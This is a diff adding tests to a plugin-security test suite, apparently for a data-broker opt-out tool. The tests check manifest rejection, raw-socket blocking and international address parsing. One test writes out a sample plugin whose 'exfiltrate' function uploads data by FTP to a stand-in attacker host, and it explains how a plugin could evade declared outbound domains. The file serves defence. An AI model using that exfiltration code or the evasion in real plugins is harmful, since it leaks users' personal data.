@@ -461,6 +461,89 @@ def t_wildcard_scope():
     # IF THIS FAILS: a non-email plugin could claim "reach anywhere" egress.
 
 
+@test(1, "permissions.naive_exfil_manifest_rejected_pre_install",
+      "A manifest for a plugin that reads members' details and reaches the network, with no "
+      "declared exception, is rejected before a single line of its code is even inspected.")
+def t_naive_exfil_manifest_rejected():
+    PluginManifest = _imp("plugins.permissions").PluginManifest
+    exfil = PluginManifest.from_dict({
+        "id": "broker-helper", "name": "Broker Helper", "version": "1.0", "author": "unknown",
+        "description": "Helps keep broker records tidy.",
+        "permissions": ["read_pii", "network", "storage"],
+        "methods": ["storage.get", "storage.set"], "hooks": ["on_event"],
+        "outbound_domains": ["attacker-controlled.example"],
+    })
+    errs = exfil.validate()
+    assert any("blocked by default" in e for e in errs), \
+        f"a plain read_pii+network manifest (no exception) was NOT rejected: {errs}"
+    # Lying about the exception doesn't help without a real justification.
+    thin_excuse = PluginManifest.from_dict({
+        **exfil.to_dict(), "requires_pii_network_exception": True,
+        "pii_network_justification": "needed",
+    })
+    errs2 = thin_excuse.validate()
+    assert any("too short" in e for e in errs2), \
+        f"a one-word justification for the exception was accepted: {errs2}"
+    # EXPECTED: neither a bare request nor a token-gesture justification gets past
+    #   manifest validation, which runs before upload/install ever inspects the code.
+    # IF THIS FAILS: the first and strongest gate against a data-exfiltration
+    #   plugin — refusing the combination outright — has regressed.
+
+
+@test(1, "plugin.raw_socket_outbound_domains_blocked_by_inspector",
+      "code_inspector blocks a non-email plugin that holds 'network' from using raw socket "
+      "libraries (ftplib, socket, paramiko) directly, preventing outbound_domains evasion.")
+def t_raw_socket_gap():
+    import tempfile, json as _json, textwrap
+    ci = _imp("plugins.code_inspector")
+    PluginManifest = _imp("plugins.permissions").PluginManifest
+
+    d = tempfile.mkdtemp(prefix="ps-ci-gap-")
+    try:
+        m = PluginManifest.from_dict({
+            "id": "scope-checker", "name": "Scope Checker", "version": "1.0", "author": "x",
+            # A plugin holding 'network' that isn't email (e.g. a CAPTCHA solver)
+            "permissions": ["network"], "methods": [], "hooks": [],
+            "outbound_domains": ["2captcha.example"],
+        })
+        assert not m.validate(), f"manifest should be clean on its own: {m.validate()}"
+        with open(os.path.join(d, "manifest.json"), "w") as f:
+            _json.dump(m.to_dict(), f)
+        with open(os.path.join(d, "plugin.py"), "w") as f:
+            f.write(textwrap.dedent("""
+                import ftplib
+                # Direct socket/FTP egress without host-mediated http.fetch is blocked.
+                def exfiltrate(data):
+                    ftp = ftplib.FTP("attacker-controlled.example")
+                    ftp.storbinary("STOR dump.csv", data)
+            """))
+        findings = ci.inspect_plugin_code(d, m)
+        summary = ci.summarize(findings)
+        rules = {f["rule"] for f in findings}
+        assert "network:ftplib" in rules, f"ftplib import wasn't flagged: {findings}"
+        assert summary["blocked"], "code_inspector must block raw ftplib sockets"
+    finally:
+        import shutil
+        shutil.rmtree(d, ignore_errors=True)
+    # EXPECTED: raw network libraries (socket, ftplib, paramiko, requests, ...)
+    #   are a BLOCKING (high) finding for any non-email-provider plugin that
+    #   holds 'network', not merely a medium note shown to the admin. Such a
+    #   plugin must go through plugin.http (host-mediated http.fetch), the
+    #   only path where outbound_domains is actually enforced.
+    # WHY THIS MATTERS: before this, a plugin could declare a plausible
+    #   outbound domain, request 'network' for a believable reason (e.g. a
+    #   CAPTCHA-solving API), and still reach an undeclared host directly —
+    #   the OS sandbox's network namespace is all-or-nothing and has no
+    #   notion of "this domain wasn't declared", so outbound_domains was
+    #   enforced only against plugins that stuck to the SDK's http client.
+    # IF THIS FAILS: a non-email plugin can again get a raw socket/ftplib/
+    #   paramiko import past install with only an informational note, which
+    #   reopens the outbound_domains bypass this test exists to close.
+    #   Email-provider plugins keep the separate, narrower exemption for
+    #   their own mail protocol (smtplib/imaplib/poplib/ssl/email, or an
+    #   HTTPS mail API) — see permissions.email_provider_trusted_class.
+
+
 @test(1, "interpreter.spec_validation",
       "A well-formed broker spec validates; a malformed one (bad step, unknown field) is rejected.")
 def t_spec_validation():
@@ -10107,6 +10190,58 @@ def t_forms_executor():
     page2 = _FormPage(success_text="Thanks, your request received.", options={"li": ["Kansas"]})
     r2 = asyncio.run(ci.PlaywrightExecutor(page=page2).run(ci.compile_job(spec, fields, "1")))
     assert r2.ok and r2.verified and not r2.email_rejected, r2
+
+
+@test(1, "i18n.international_profile_resolution",
+      "Address parser, date parser, and member fields handle international formats: Arabic comma, "
+      "alphanumeric/European postcodes, mononyms, DD/MM/YYYY dates, and Eastern Arabic numerals.")
+def t_i18n_intl_profile():
+    cmb = _imp("core.combinations")
+    age_mod = _imp("core.age")
+    mf = _imp("core.interpreter.member_fields")
+    res_addr = _imp("core.resident_addresses")
+
+    # 1. Address parsing with Arabic comma and European / UK formats
+    ar_addr = "شارع المعز لدين الله الفاطمي، القاهرة، 11511"
+    parsed_ar = cmb._parse_address(ar_addr)
+    assert parsed_ar["address"] == "شارع المعز لدين الله الفاطمي"
+    assert parsed_ar["city"] == "القاهرة"
+    assert parsed_ar["zip"] == "11511"
+
+    uk_addr = "10 Downing Street, London, SW1A 2AA"
+    parsed_uk = cmb._parse_address(uk_addr)
+    assert parsed_uk["address"] == "10 Downing Street"
+    assert parsed_uk["city"] == "London"
+    assert parsed_uk["zip"] == "SW1A 2AA"
+
+    eu_addr = "Carrer de Mallorca, 401, 08013 Barcelona"
+    parsed_eu = cmb._parse_address(eu_addr)
+    assert "401" in parsed_eu["address"]
+    assert parsed_eu["zip"] == "08013"
+
+    # 2. Date of birth parsing: unambiguous day > 12 and European dot notation
+    d1 = age_mod.parse_dob("25/04/1983")
+    assert d1 and d1.year == 1983 and d1.month == 4 and d1.day == 25
+    d2 = age_mod.parse_dob("09.04.1983")
+    assert d2 and d2.year == 1983 and d2.month == 4 and d2.day == 9
+
+    # 3. Mononyms (single legal name)
+    class MononymMember:
+        full_name, formal_name, age = "Dewi", "", 30
+        identities = []
+    resolved = mf.resolve(MononymMember())
+    assert resolved["first_name"] == "Dewi"
+    assert resolved["last_name"] == "Dewi"
+
+    # 4. Eastern Arabic / Persian numerals in phone numbers
+    assert mf.phone_digits("٠١٠١٢٣٤٥٦٧٨") == "01012345678"
+    assert mf.phone_e164("+44 20 7946 0958") == "+442079460958"
+    assert mf.phone_e164("00442079460958") == "+442079460958"
+
+    # 5. Resident addresses with house number at end or alphanumeric postal code
+    cleaned = res_addr.clean("Calle Mayor 12", zip_code="SW1A 2AA")
+    assert "CALLE MAYOR 12" in cleaned["street"]
+    assert cleaned["zip"] == "SW1A2AA"
 
 
 @test(2, "forms.engine_retries_without_plus_and_never_guesses",
